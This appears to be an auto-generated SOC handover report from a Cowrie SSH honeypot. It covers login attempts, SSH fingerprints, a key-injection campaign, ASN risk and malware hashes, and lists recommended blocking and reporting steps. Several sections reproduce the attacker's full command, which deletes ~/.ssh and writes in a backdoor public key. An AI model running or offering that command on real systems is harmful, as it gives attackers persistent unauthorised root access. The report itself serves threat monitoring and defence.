# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-11 |
| **Generated At** | 2026-04-11T12:54:11Z |
| **Shift Time** | 12:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **114** |
| Confirmed Threats | **87** |
| False Positives Filtered | **27** (23.7%) |
| Unique Attacker IPs | **8** |
| Countries of Origin | **6** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **102** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **40** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **19** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 6 |
| `ubuntu` | 2 |
| `test` | 2 |
| `GET / HTTP/1.1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ABCABC` | `191.101.59.100` | 2026-04-11T10:46:02 |
| `root` | `3245gs5662d34` | `191.101.59.100` | 2026-04-11T10:46:17 |
| `root` | `abcd` | `191.101.59.100` | 2026-04-11T10:48:44 |
| `root` | `qqZZ123` | `191.101.59.100` | 2026-04-11T10:56:47 |
| `root` | `admin12345@123` | `191.101.59.100` | 2026-04-11T11:07:34 |
| `root` | `qwe2025` | `191.101.59.100` | 2026-04-11T11:12:59 |
| `root` | `123456-QWER` | `191.101.59.100` | 2026-04-11T11:23:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **114** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 39 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 39 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 39 | 2 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `191.101.59.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **8** |
| Unique ASNs | **7** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS42831` | UK Dedicated Servers Limited | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ea341c7c33fb

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 10:45 |
| **Last Seen** | 2026-04-11 10:46 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 10:45:59` | `cowrie.session.connect` |
| `2026-04-11 10:45:59` | `cowrie.client.version` |
| `2026-04-11 10:46:00` | `cowrie.client.kex` |
| `2026-04-11 10:46:02` | `cowrie.login.success` |
| `2026-04-11 10:46:04` | `cowrie.session.params` |
| `2026-04-11 10:46:04` | `cowrie.command.input` |
| `2026-04-11 10:46:04` | `cowrie.command.failed` |
| `2026-04-11 10:46:04` | `cowrie.log.closed` |
| `2026-04-11 10:46:06` | `cowrie.session.params` |
| `2026-04-11 10:46:06` | `cowrie.command.input` |
| `2026-04-11 10:46:06` | `cowrie.session.file_download` |
| `2026-04-11 10:46:06` | `cowrie.log.closed` |
| `2026-04-11 10:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f388e9e43f58

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 10:46 |
| **Last Seen** | 2026-04-11 10:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 10:46:13` | `cowrie.session.connect` |
| `2026-04-11 10:46:14` | `cowrie.client.version` |
| `2026-04-11 10:46:15` | `cowrie.client.kex` |
| `2026-04-11 10:46:17` | `cowrie.login.success` |
| `2026-04-11 10:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04064a836d82

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 10:48 |
| **Last Seen** | 2026-04-11 10:48 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 10:48:41` | `cowrie.session.connect` |
| `2026-04-11 10:48:41` | `cowrie.client.version` |
| `2026-04-11 10:48:41` | `cowrie.client.kex` |
| `2026-04-11 10:48:44` | `cowrie.login.success` |
| `2026-04-11 10:48:45` | `cowrie.session.params` |
| `2026-04-11 10:48:45` | `cowrie.command.input` |
| `2026-04-11 10:48:45` | `cowrie.command.failed` |
| `2026-04-11 10:48:46` | `cowrie.log.closed` |
| `2026-04-11 10:48:46` | `cowrie.session.params` |
| `2026-04-11 10:48:46` | `cowrie.command.input` |
| `2026-04-11 10:48:47` | `cowrie.session.file_download` |
| `2026-04-11 10:48:47` | `cowrie.log.closed` |
| `2026-04-11 10:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f068d35aff83

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 10:48 |
| **Last Seen** | 2026-04-11 10:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 10:48:54` | `cowrie.session.connect` |
| `2026-04-11 10:48:54` | `cowrie.client.version` |
| `2026-04-11 10:48:54` | `cowrie.client.kex` |
| `2026-04-11 10:48:56` | `cowrie.login.success` |
| `2026-04-11 10:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56fb317136c1

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 10:56 |
| **Last Seen** | 2026-04-11 10:57 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 10:56:45` | `cowrie.session.connect` |
| `2026-04-11 10:56:45` | `cowrie.client.version` |
| `2026-04-11 10:56:46` | `cowrie.client.kex` |
| `2026-04-11 10:56:47` | `cowrie.login.success` |
| `2026-04-11 10:56:47` | `cowrie.session.params` |
| `2026-04-11 10:56:47` | `cowrie.command.input` |
| `2026-04-11 10:56:47` | `cowrie.command.failed` |
| `2026-04-11 10:56:48` | `cowrie.log.closed` |
| `2026-04-11 10:56:51` | `cowrie.session.params` |
| `2026-04-11 10:56:51` | `cowrie.command.input` |
| `2026-04-11 10:56:51` | `cowrie.session.file_download` |
| `2026-04-11 10:56:51` | `cowrie.log.closed` |
| `2026-04-11 10:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f668a4372d1

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 10:56 |
| **Last Seen** | 2026-04-11 10:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 10:56:59` | `cowrie.session.connect` |
| `2026-04-11 10:56:59` | `cowrie.client.version` |
| `2026-04-11 10:56:59` | `cowrie.client.kex` |
| `2026-04-11 10:57:01` | `cowrie.login.success` |
| `2026-04-11 10:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8397e8649b09

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 11:07 |
| **Last Seen** | 2026-04-11 11:07 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 11:07:31` | `cowrie.session.connect` |
| `2026-04-11 11:07:33` | `cowrie.client.version` |
| `2026-04-11 11:07:33` | `cowrie.client.kex` |
| `2026-04-11 11:07:34` | `cowrie.login.success` |
| `2026-04-11 11:07:35` | `cowrie.session.params` |
| `2026-04-11 11:07:35` | `cowrie.command.input` |
| `2026-04-11 11:07:35` | `cowrie.command.failed` |
| `2026-04-11 11:07:36` | `cowrie.log.closed` |
| `2026-04-11 11:07:39` | `cowrie.session.params` |
| `2026-04-11 11:07:39` | `cowrie.command.input` |
| `2026-04-11 11:07:40` | `cowrie.session.file_download` |
| `2026-04-11 11:07:40` | `cowrie.log.closed` |
| `2026-04-11 11:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-597413997f81

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 11:07 |
| **Last Seen** | 2026-04-11 11:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 11:07:44` | `cowrie.session.connect` |
| `2026-04-11 11:07:45` | `cowrie.client.version` |
| `2026-04-11 11:07:45` | `cowrie.client.kex` |
| `2026-04-11 11:07:49` | `cowrie.login.success` |
| `2026-04-11 11:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3c36aaaca0

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 11:12 |
| **Last Seen** | 2026-04-11 11:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 11:12:56` | `cowrie.session.connect` |
| `2026-04-11 11:12:57` | `cowrie.client.version` |
| `2026-04-11 11:12:57` | `cowrie.client.kex` |
| `2026-04-11 11:12:59` | `cowrie.login.success` |
| `2026-04-11 11:13:00` | `cowrie.session.params` |
| `2026-04-11 11:13:00` | `cowrie.command.input` |
| `2026-04-11 11:13:00` | `cowrie.command.failed` |
| `2026-04-11 11:13:00` | `cowrie.log.closed` |
| `2026-04-11 11:13:03` | `cowrie.session.params` |
| `2026-04-11 11:13:03` | `cowrie.command.input` |
| `2026-04-11 11:13:03` | `cowrie.session.file_download` |
| `2026-04-11 11:13:03` | `cowrie.log.closed` |
| `2026-04-11 11:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76e282f35278

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 11:13 |
| **Last Seen** | 2026-04-11 11:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 11:13:10` | `cowrie.session.connect` |
| `2026-04-11 11:13:10` | `cowrie.client.version` |
| `2026-04-11 11:13:11` | `cowrie.client.kex` |
| `2026-04-11 11:13:12` | `cowrie.login.success` |
| `2026-04-11 11:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62bb99bc4ba

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 11:23 |
| **Last Seen** | 2026-04-11 11:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 11:23:06` | `cowrie.session.connect` |
| `2026-04-11 11:23:06` | `cowrie.client.version` |
| `2026-04-11 11:23:06` | `cowrie.client.kex` |
| `2026-04-11 11:23:07` | `cowrie.login.success` |
| `2026-04-11 11:23:07` | `cowrie.session.params` |
| `2026-04-11 11:23:07` | `cowrie.command.input` |
| `2026-04-11 11:23:07` | `cowrie.command.failed` |
| `2026-04-11 11:23:07` | `cowrie.log.closed` |
| `2026-04-11 11:23:07` | `cowrie.session.params` |
| `2026-04-11 11:23:07` | `cowrie.command.input` |
| `2026-04-11 11:23:07` | `cowrie.session.file_download` |
| `2026-04-11 11:23:07` | `cowrie.log.closed` |
| `2026-04-11 11:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1406d5c37aa4

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]100` |
| **First Seen** | 2026-04-11 11:23 |
| **Last Seen** | 2026-04-11 11:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 11:23:10` | `cowrie.session.connect` |
| `2026-04-11 11:23:10` | `cowrie.client.version` |
| `2026-04-11 11:23:10` | `cowrie.client.kex` |
| `2026-04-11 11:23:10` | `cowrie.login.success` |
| `2026-04-11 11:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]100` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.1.104[.]124` | **21** | 2026-04-11 11:16 | 2026-04-11 11:20 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `191.101.59[.]100` | **20** | 2026-04-11 10:32 | 2026-04-11 11:23 | 1m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.212.28[.]141` | **17** | 2026-04-11 11:16 | 2026-04-11 11:19 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `39.100.183[.]18` | **10** | 2026-04-11 10:31 | 2026-04-11 10:35 | 16m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **7** | 2026-04-11 11:04 | 2026-04-11 11:13 | 0m | 6 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
